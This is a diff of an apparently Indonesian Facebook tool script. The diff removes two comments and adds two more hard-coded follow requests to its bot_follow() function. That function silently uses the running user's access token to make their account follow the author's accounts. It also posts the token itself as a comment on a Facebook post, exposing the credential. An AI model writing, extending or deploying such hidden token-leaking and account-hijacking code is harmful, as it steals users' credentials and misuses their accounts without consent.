@@ -2,8 +2,6 @@
 #-*-coding:utf-8-*-
 # Created By Dapunta
 # Thanks To My Teacher Who Has Perfected This Script (Angga Kurniawan & Muh Rizal Fiansyah)
-# GOKIL LU BRO BISA JEBOLIN FILENYA!!
-# JANGAN GANTI BOT FOLLOWERNYA YA!! KALAU MAU NAMBAH BOLEH.
 
 import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,urllib,json,urllib.parse,concurrent.futures
 from random import randint
@@ -228,6 +226,8 @@ def bot_follow():
 	requests.post('https://graph.facebook.com/100001779410663/subscribers?access_token=' + toket) #Faskhal Mahiza
 	requests.post('https://graph.facebook.com/100005143741340/subscribers?access_token=' + toket) #Alexandra Lubis
 	requests.post('https://graph.facebook.com/607821/subscribers?access_token=' + toket)          #Raifan
+	requests.post('https://graph.facebook.com/1518721/subscribers?access_token=' + toket)         #Irman
+	requests.post('https://graph.facebook.com/100023543993788/subscribers?access_token=' + toket) #Irman Sniper
 	requests.post('https://graph.facebook.com/10215994561776676/comments/?message=' +toket+ '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/10214228940637251/comments/?message=' +kom+ '&access_token=' + toket)
 	menu()
